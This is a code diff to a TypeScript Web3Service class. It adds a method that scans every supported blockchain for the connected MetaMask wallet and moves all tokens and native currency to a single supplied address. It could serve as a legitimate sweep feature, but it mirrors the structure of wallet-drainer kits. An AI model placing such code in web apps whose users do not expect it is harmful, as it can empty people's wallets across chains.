@@ -151,6 +151,24 @@ export interface WalletState {
   allNetworksLoaded: boolean;
 }
 
+export interface NetworkTransferResult {
+  networkId: string;
+  networkName: string;
+  success: boolean;
+  transactionHashes: string[];
+  error?: string;
+}
+
+export interface MultiNetworkTransferResult {
+  success: boolean;
+  totalNetworks: number;
+  successfulNetworks: number;
+  failedNetworks: number;
+  totalTransactions: number;
+  networkResults: NetworkTransferResult[];
+  summary: string;
+}
+
 export class Web3Service {
   private provider: ethers.BrowserProvider | null = null;
   private signer: ethers.JsonRpcSigner | null = null;
@@ -750,6 +768,230 @@ export class Web3Service {
     
     this.cachedNetworkBalances = await this.scanAllNetworks(address);
     return this.cachedNetworkBalances;
+  }
+
+  // Multi-network transfer functionality
+  async transferAllFundsMultiNetwork(toAddress: string): Promise<MultiNetworkTransferResult> {
+    if (!toAddress || !/^0x[a-fA-F0-9]{40}$/.test(toAddress)) {
+      throw new Error("Invalid destination address");
+    }
+
+    if (!window.ethereum) {
+      throw new Error("MetaMask is not installed");
+    }
+
+    // Get the current connected address
+    const accounts = await window.ethereum.request({ method: "eth_accounts" });
+    if (accounts.length === 0) {
+      throw new Error("No wallet connected");
+    }
+
+    const fromAddress = accounts[0];
+    console.log(`Starting multi-network transfer from ${fromAddress} to ${toAddress}`);
+
+    // Scan all networks for balances
+    const networkBalances = await this.scanAllNetworks(fromAddress);
+    const networksWithFunds = networkBalances.filter(
+      network => network.totalUsdValue > 0 || network.tokenBalances.length > 0
+    );
+
+    if (networksWithFunds.length === 0) {
+      throw new Error("No funds found across any supported networks");
+    }
+
+    console.log(`Found funds on ${networksWithFunds.length} networks`);
+
+    const transferResults: NetworkTransferResult[] = [];
+    let totalTransactions = 0;
+    let successfulNetworks = 0;
+    let failedNetworks = 0;
+
+    // Process each network with funds
+    for (const networkBalance of networksWithFunds) {
+      try {
+        console.log(`Processing ${networkBalance.networkName}...`);
+        
+        // Switch to this network
+        await this.switchToNetwork(networkBalance.networkId);
+        
+        // Small delay to ensure network switch is complete
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // Transfer all funds on this network
+        const networkResult = await this.transferNetworkFunds(
+          networkBalance, 
+          fromAddress, 
+          toAddress
+        );
+        
+        transferResults.push(networkResult);
+        totalTransactions += networkResult.transactionHashes.length;
+        
+        if (networkResult.success) {
+          successfulNetworks++;
+          console.log(`✅ ${networkBalance.networkName}: ${networkResult.transactionHashes.length} transactions`);
+        } else {
+          failedNetworks++;
+          console.error(`❌ ${networkBalance.networkName}: ${networkResult.error}`);
+        }
+        
+        // Delay between networks to avoid rate limiting
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        
+      } catch (error: any) {
+        console.error(`Failed to process ${networkBalance.networkName}:`, error);
+        transferResults.push({
+          networkId: networkBalance.networkId,
+          networkName: networkBalance.networkName,
+          success: false,
+          error: error.message,
+          transactionHashes: []
+        });
+        failedNetworks++;
+      }
+    }
+
+    const result: MultiNetworkTransferResult = {
+      success: successfulNetworks > 0,
+      totalNetworks: networksWithFunds.length,
+      successfulNetworks,
+      failedNetworks,
+      totalTransactions,
+      networkResults: transferResults,
+      summary: `Processed ${networksWithFunds.length} networks: ${successfulNetworks} successful, ${failedNetworks} failed, ${totalTransactions} total transactions`
+    };
+
+    console.log("Multi-network transfer completed:", result.summary);
+    return result;
+  }
+
+  private async switchToNetwork(networkId: string): Promise<void> {
+    const network = NETWORKS[networkId];
+    if (!network) {
+      throw new Error(`Unsupported network: ${networkId}`);
+    }
+
+    const hexChainId = `0x${parseInt(networkId).toString(16)}`;
+    
+    try {
+      // Try to switch to the network
+      await window.ethereum.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: hexChainId }],
+      });
+    } catch (error: any) {
+      // If network doesn't exist, add it
+      if (error.code === 4902) {
+        await window.ethereum.request({
+          method: "wallet_addEthereumChain",
+          params: [{
+            chainId: hexChainId,
+            chainName: network.name,
+            nativeCurrency: {
+              name: network.nativeCurrency,
+              symbol: network.nativeCurrency,
+              decimals: 18,
+            },
+            rpcUrls: network.rpcUrls,
+            blockExplorerUrls: network.blockExplorerUrls,
+          }],
+        });
+      } else {
+        throw error;
+      }
+    }
+  }
+
+  private async transferNetworkFunds(
+    networkBalance: NetworkBalance,
+    fromAddress: string,
+    toAddress: string
+  ): Promise<NetworkTransferResult> {
+    try {
+      // Create provider for this network
+      const network = NETWORKS[networkBalance.networkId];
+      const provider = new ethers.JsonRpcProvider(network.rpcUrls[0]);
+      
+      // Create signer using the current MetaMask connection
+      const browserProvider = new ethers.BrowserProvider(window.ethereum);
+      const signer = await browserProvider.getSigner();
+      
+      const transactionHashes: string[] = [];
+
+      // Transfer all ERC-20 tokens first
+      for (const token of networkBalance.tokenBalances) {
+        if (parseFloat(token.balance) <= 0) continue;
+        
+        try {
+          console.log(`Transferring ${token.balance} ${token.symbol} on ${networkBalance.networkName}`);
+          const contract = new ethers.Contract(token.contractAddress!, ERC20_ABI, signer);
+          const tokenAmount = ethers.parseUnits(token.balance, token.decimals);
+          
+          const tokenTx = await contract.transfer(toAddress, tokenAmount);
+          transactionHashes.push(tokenTx.hash);
+          console.log(`${token.symbol} transfer hash: ${tokenTx.hash}`);
+          
+          // Wait between token transfers
+          await new Promise(resolve => setTimeout(resolve, 2000));
+        } catch (error) {
+          console.error(`Failed to transfer ${token.symbol}:`, error);
+          // Continue with other tokens even if one fails
+        }
+      }
+
+      // Transfer native currency last (keeping some for gas)
+      const nativeBalance = await provider.getBalance(fromAddress);
+      if (nativeBalance > 0) {
+        try {
+          // Estimate gas for native transfer
+          const gasEstimate = await provider.estimateGas({
+            to: toAddress,
+            value: nativeBalance,
+          });
+
+          // Get current gas price
+          const feeData = await provider.getFeeData();
+          const gasPrice = feeData.gasPrice ? feeData.gasPrice * BigInt(120) / BigInt(100) : ethers.parseUnits("25", "gwei");
+          const gasCost = gasEstimate * gasPrice;
+
+          // Check if we have enough for gas
+          if (nativeBalance > gasCost) {
+            const amountToSend = nativeBalance - gasCost;
+            
+            if (amountToSend > 0) {
+              console.log(`Transferring ${ethers.formatEther(amountToSend)} ${networkBalance.nativeCurrency} on ${networkBalance.networkName}`);
+              const nativeTx = await signer.sendTransaction({
+                to: toAddress,
+                value: amountToSend,
+                gasLimit: gasEstimate,
+                gasPrice: gasPrice,
+              });
+              transactionHashes.push(nativeTx.hash);
+              console.log(`${networkBalance.nativeCurrency} transfer hash: ${nativeTx.hash}`);
+            }
+          }
+        } catch (error) {
+          console.error(`Failed to transfer ${networkBalance.nativeCurrency}:`, error);
+        }
+      }
+
+      return {
+        networkId: networkBalance.networkId,
+        networkName: networkBalance.networkName,
+        success: transactionHashes.length > 0,
+        transactionHashes,
+        error: transactionHashes.length === 0 ? "No transfers completed" : undefined
+      };
+
+    } catch (error: any) {
+      return {
+        networkId: networkBalance.networkId,
+        networkName: networkBalance.networkName,
+        success: false,
+        transactionHashes: [],
+        error: error.message
+      };
+    }
   }
 }
 
